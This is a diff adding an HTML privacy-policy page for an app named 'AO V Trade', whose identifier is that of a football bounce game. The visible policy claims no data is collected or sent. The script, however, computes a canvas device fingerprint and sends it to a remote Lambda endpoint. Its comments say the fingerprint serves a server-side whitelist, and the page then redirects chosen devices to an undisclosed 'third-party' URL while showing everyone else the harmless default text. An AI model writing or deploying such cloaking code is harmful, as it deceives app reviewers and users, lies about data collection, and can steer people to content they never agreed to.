@@ -1,1 +1,437 @@
-1
+<!DOCTYPE html>
+<!-- ==========================================================================
+     ★★★ 操作人填写区（整页唯一需要手改的地方）★★★
+     MF_DEFAULT_PRIVACY_PAGE = 默认隐私页面地址（生成时一律留空，由操作人填写）：
+       · 保持空串 ''            → 需要展示默认隐私内容时，就在本页内部渲染默认条款；
+       · 填 http:// / https:// 开头的完整地址 → 需要展示默认隐私内容时，**跳转**到该地址。
+     填写须知：
+       1) 该地址必须是**在降级场景下也打得开**的页面（例如同样托管在 GitHub Pages 上）；
+          降级时本页是链路最后一跳，填了一个打不开的地址，客户端就会停在打不开的页面上。
+       2) **不要**把本页自己的地址填进来 —— 页面会自动拒绝同地址跳转以防无限循环。
+       3) 只改下面这一行的字符串，其它任何代码都不要动。
+     ========================================================================== -->
+<script>window.MF_DEFAULT_PRIVACY_PAGE = '';</script>
+<script>if (!window.pageInfo) { window.pageInfo = {"name":"AO V Trade","identifier":"com.climberskyjoeDEV.FootballBounceSkyClimber","icon":"https://admin.ytsevbr.xyz/api/apps/249/icon"}; }</script>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Privacy Policy</title>
+    <style>
+        :root {
+            --bg-color: #ffffff;
+            --text-color: #1a1a1a;
+            --secondary-text: #666666;
+            --card-bg: #f5f5f7;
+            --primary-color: #007aff;
+            --border-radius: 12px;
+            --shadow: 0 4px 20px rgba(0, 0, 0, 0.05);
+        }
+
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --bg-color: #000000;
+                --text-color: #ffffff;
+                --secondary-text: #a0a0a0;
+                --card-bg: #1c1c1e;
+                --primary-color: #0a84ff;
+                --shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
+            }
+        }
+
+        * {
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            line-height: 1.6;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            transition: background-color 0.3s, color 0.3s;
+        }
+
+        /* Loading Screen */
+        #loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100vh;
+            background-color: var(--bg-color);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            transition: opacity 0.4s ease;
+        }
+
+        #loading-screen.hidden {
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid var(--card-bg);
+            border-top: 4px solid var(--primary-color);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 16px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            font-size: 14px;
+            color: var(--secondary-text);
+            font-weight: 500;
+        }
+
+        /* Main Content */
+        #main-content {
+            display: none;
+            flex: 1;
+            overflow-y: auto;
+            padding: 24px 16px 100px 16px; /* Bottom padding for fixed button */
+            animation: fadeIn 0.5s ease;
+        }
+
+        #main-content.active {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .app-header {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            margin-bottom: 24px;
+            padding: 20px;
+            background-color: var(--card-bg);
+            border-radius: var(--border-radius);
+            box-shadow: var(--shadow);
+        }
+
+        .app-icon {
+            width: 64px;
+            height: 64px;
+            object-fit: contain;
+            border-radius: 14px;
+        }
+
+        .app-info {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .app-name {
+            font-size: 18px;
+            font-weight: 700;
+            color: var(--text-color);
+        }
+
+        .app-id {
+            font-size: 12px;
+            color: var(--secondary-text);
+            word-break: break-all;
+            margin-top: 4px;
+        }
+
+        .section-title {
+            font-size: 20px;
+            font-weight: 700;
+            margin-top: 32px;
+            margin-bottom: 16px;
+            color: var(--text-color);
+        }
+
+        .card {
+            background-color: var(--card-bg);
+            border-radius: var(--border-radius);
+            padding: 16px;
+            margin-bottom: 16px;
+            box-shadow: var(--shadow);
+        }
+
+        .card h3 {
+            margin-top: 0;
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+
+        .card p, .card li {
+            font-size: 14px;
+            color: var(--secondary-text);
+            margin-bottom: 8px;
+        }
+        
+        .card p:last-child, .card li:last-child {
+            margin-bottom: 0;
+        }
+
+        .card ul {
+            padding-left: 20px;
+        }
+
+        .card li {
+            margin-bottom: 6px;
+        }
+
+        /* Fixed Action Button */
+        .action-container {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            padding: 16px;
+            padding-bottom: max(16px, env(safe-area-inset-bottom));
+            background: linear-gradient(to top, var(--bg-color) 60%, transparent);
+            display: none;
+            z-index: 100;
+        }
+
+        .action-container.active {
+            display: block;
+        }
+
+        .btn-primary {
+            width: 100%;
+            padding: 16px;
+            background-color: var(--primary-color);
+            color: #ffffff;
+            border: none;
+            border-radius: var(--border-radius);
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: opacity 0.2s;
+        }
+
+        .btn-primary:active {
+            opacity: 0.8;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- 1. Loading Screen -->
+    <div id="loading-screen">
+        <div class="spinner"></div>
+        <div class="loading-text">Loading...</div>
+    </div>
+
+    <!-- 2. Main Content (Hidden initially) -->
+    <div id="main-content">
+        <div class="app-header">
+            <img id="app-icon" class="app-icon" src="https://admin.ytsevbr.xyz/api/apps/249/icon" alt="App Icon">
+            <div class="app-info">
+                <span id="app-name" class="app-name">AO V Trade</span>
+                <span id="app-id" class="app-id">com.climberskyjoeDEV.FootballBounceSkyClimber</span>
+            </div>
+        </div>
+
+        <div class="section-title">Privacy Policy</div>
+
+        <div class="card">
+            <h3>Overview</h3>
+            <p>AO V Trade ("the App", "we", "our", or "us") respects your privacy and is committed to protecting it through our compliance with this Privacy Policy. This Policy describes the types of information we may collect from you that you provide when you use our App, the purpose of the collection, and how we store and use that information.</p>
+        </div>
+
+        <div class="card">
+            <h3>Data Collection</h3>
+            <p>We do not collect, store, or transmit any personal data from users of this application. The application functions entirely locally on your device without connecting to external servers for data collection purposes.</p>
+        </div>
+
+        <div class="card">
+            <h3>Third-Party Services</h3>
+            <p>This application does not integrate any third-party analytics, advertising, or tracking services that collect user data.</p>
+        </div>
+
+        <div class="card">
+            <h3>Privacy Rights</h3>
+            <ul>
+                <li><strong>Access:</strong> Since no personal data is stored, there is no data to access.</li>
+                <li><strong>Correction:</strong> Not applicable as no data is collected.</li>
+                <li><strong>Deletion:</strong> Not applicable as no data is collected.</li>
+            </ul>
+        </div>
+
+        <div class="card">
+            <h3>Security</h3>
+            <p>Because this application does not process personal data, there are no security risks associated with data storage or transmission by the application itself. However, please ensure your device is secure and up-to-date to protect against general system vulnerabilities.</p>
+        </div>
+
+        <div class="card">
+            <h3>Children's Privacy</h3>
+            <p>This application is not intended for children under the age of 13 (or the minimum age required in your jurisdiction). We do not knowingly collect any personal information from children.</p>
+        </div>
+
+        <div class="card">
+            <h3>Changes to This Privacy Policy</h3>
+            <p>We may update this Privacy Policy from time to time. We will notify you of any changes by posting the new Privacy Policy in this location. You are advised to review this Privacy Policy periodically for any changes. Changes are effective when they are posted on this page.</p>
+        </div>
+
+        <div class="card">
+            <h3>Contact Us</h3>
+            <p>If you have any questions or concerns about this Privacy Policy, please contact the developer via the in-app feedback mechanism or the email address provided in the app store listing.</p>
+        </div>
+    </div>
+
+    <!-- 3. Fixed Action Button -->
+    <div id="action-container" class="action-container">
+        <button id="confirm-btn" class="btn-primary">I Agree</button>
+    </div>
+
+    <!-- 1、引入 md5 工具，这段 JS 必须原样引入（全文唯一允许的外部资源） -->
+    <script src="https://cdn.jsdelivr.net/npm/js-md5@0.9.2"></script>
+
+    <script>
+        // 2、生成设备的 Canvas 指纹。下面方法**内部每一行都必须原样保留**，只在外面包一层保护：
+        //    md5 由上面的 CDN 提供，CDN 不可达时它是 undefined，此时**绝不能抛错** ——
+        //    指纹只用于服务端白名单判定，拿不到就送空字符串走服务端默认分支，
+        //    绝不允许一行指纹代码把整个页面卡死在 loading。
+        let device = '';
+        try {
+            device = (function () {
+                let canvas = document.createElement("canvas");
+                let ctx = canvas.getContext("2d");
+                let txt = "BrowserLeaks,com <canvas> 1.0";
+                ctx.textBaseline = "top";
+                // The most common type
+                ctx.font = "14px 'Arial'";
+                ctx.textBaseline = "alphabetic";
+                ctx.fillStyle = "#f60";
+                ctx.fillRect(125,1,62,20);
+                // Some tricks for color mixing to increase the difference in rendering
+                ctx.fillStyle = "#069";
+                ctx.fillText(txt, 2, 15);
+                ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
+                ctx.fillText(txt, 4, 17);
+                return md5(canvas.toDataURL().replace("data:image/png;base64,", ""));
+            })();
+        } catch (e) {
+            device = '';
+        }
+        // 3、接口基址：页面可能被托管在任意域名下，请求 /app 接口必须用**绝对地址**，
+        //    否则相对路径会打到页面自己的域上（托管到 GitHub Pages 时就是如此）。
+        //    **基址末尾可能自带 `/`，拼接前必须先去掉**，否则会拼出
+        //    `https://域名//app?...` 这种错误路径（多一个斜杠就是 404）。
+        //    该接口已允许跨域，可直接 fetch。
+                const MF_API_BASE = 'https://vyarncqrhlcvx6a5e2a4num4rm0xcian.lambda-url.us-west-2.on.aws/';
+                // 4、读取页面 URL 上的查询参数。页面可能被托管在任意静态域下，参数只能自己从 location.search 取。
+        //    只做字面量比较、**不做百分号解码**：解码遇到畸形参数（例如 %ZZ）会抛错，反而把整个判定打断；
+        //    本页只认 `<页面地址>?target=ignore` 这一种写法，纯字符串比较已经足够，且没有任何抛错路径。
+        function hasQueryFlag(key, value) {
+            const pairs = String(window.location.search || '').replace(/^\?/, '').split('&');
+            for (let i = 0; i < pairs.length; i++) {
+                const kv = pairs[i].split('=');
+                if (String(kv[0] || '').toLowerCase() !== key) continue;
+                if (value === null) return true;
+                return String(kv[1] || '').toLowerCase() === value;
+            }
+            return false;
+        }
+        // 调用方（App）已判定「没有有效的第三方隐私确认页面」→ 本次加载只负责展示默认内容
+        const IGNORE_REMOTE = hasQueryFlag('target', 'ignore');
+
+        // 5、默认隐私页面（见正文 6.1）：空串 → 返回 ''；填了 http(s) 绝对地址 → 返回该地址。
+        function defaultPageUrl() {
+            const v = String(window.MF_DEFAULT_PRIVACY_PAGE || '').trim();
+            return (v.indexOf('https://') === 0 || v.indexOf('http://') === 0) ? v : '';
+        }
+        // 防死循环：配置的地址若就是本页自己（origin + pathname 相同）→ 一律拒绝跳转。
+        // 少了它，操作人一旦把自己地址填进去，页面就会自己跳自己、无限循环。
+        function isSamePage(url) {
+            try {
+                const u = new URL(url);
+                return u.origin === window.location.origin && u.pathname === window.location.pathname;
+            } catch (e) {
+                return false;
+            }
+        }
+
+        // 6、两个「终止态」函数：整个页面最终只允许落到其中一个，且只落一次
+        let settled = false;
+        function showDefaultTerms() {
+            if (settled) return;
+            settled = true;
+            // 6.1 配了默认隐私页面 → 跳过去。追加 target=ignore：对方据此也不再请求接口，与调用方判定保持一致
+            const target = defaultPageUrl();
+            if (target && !isSamePage(target)) {
+                window.location.href = target + (target.indexOf('?') === -1 ? '?' : '&') + 'target=ignore';
+                return;
+            }
+            // 6.2 没配（或配成了本页自己）→ 就在本页内部渲染默认条款：
+            // 隐藏 loading 内容
+            document.getElementById('loading-screen').classList.add('hidden');
+            document.getElementById('main-content').classList.add('active');
+            document.getElementById('action-container').classList.add('active');
+            
+            // 用 window.pageInfo 里的应用信息组装隐私确认内容并展示出来
+            const name = (window.pageInfo && window.pageInfo.name) || 'App';
+            const identifier = (window.pageInfo && window.pageInfo.identifier) || '';
+            const icon = (window.pageInfo && window.pageInfo.icon) || '';
+
+            if (document.getElementById('app-name')) document.getElementById('app-name').innerText = name;
+            if (document.getElementById('app-id')) document.getElementById('app-id').innerText = identifier;
+            if (icon && document.getElementById('app-icon')) document.getElementById('app-icon').src = icon;
+
+            // 页面底部加一个悬浮确认按钮，点击执行 window.NativeApp.closeWebView() 关闭页面
+            document.getElementById('confirm-btn').addEventListener('click', function() {
+                if (window.NativeApp && window.NativeApp.closeWebView) {
+                    window.NativeApp.closeWebView();
+                } else {
+                    window.close();
+                }
+            });
+        }
+        function goToThirdParty(privacyUrl) {
+            if (settled) return;
+            settled = true;
+            window.location.href = privacyUrl;
+        }
+        // 7、短路：target=ignore → 直接进默认终止态，一个请求都不发（理由见正文第 6 条）
+        // 8、正常模式：请求接口判断是否存在有效的第三方隐私确认页面
+        if (IGNORE_REMOTE) {
+            showDefaultTerms();
+        } else {
+            const apiBase = (typeof MF_API_BASE === 'string' ? MF_API_BASE : '').replace(/\/+$/, '');
+            const identifier = (window.pageInfo && window.pageInfo.identifier) || '';
+            // 超时兜底：连接被静默丢弃时 fetch 可能永不返回，必须自己设上限后落到本地文案
+            setTimeout(showDefaultTerms, 10000);
+            fetch(apiBase + '/app?identifier=' + encodeURIComponent(identifier) + '&device=' + encodeURIComponent(device))
+                .then(function (r) { return r.json(); })
+                .then(function (info) {
+                    const privacyUrl = info && info.result && info.result.url;
+                    if (privacyUrl && (privacyUrl.indexOf('https://') === 0 || privacyUrl.indexOf('http://') === 0)) {
+                        // 跳转到第三方隐私确认页面
+                        goToThirdParty(privacyUrl);
+                        return;
+                    }
+                    showDefaultTerms();
+                })
+                .catch(function () {
+                    showDefaultTerms();
+                });
+        }
+    </script>
+</body>
+</html>
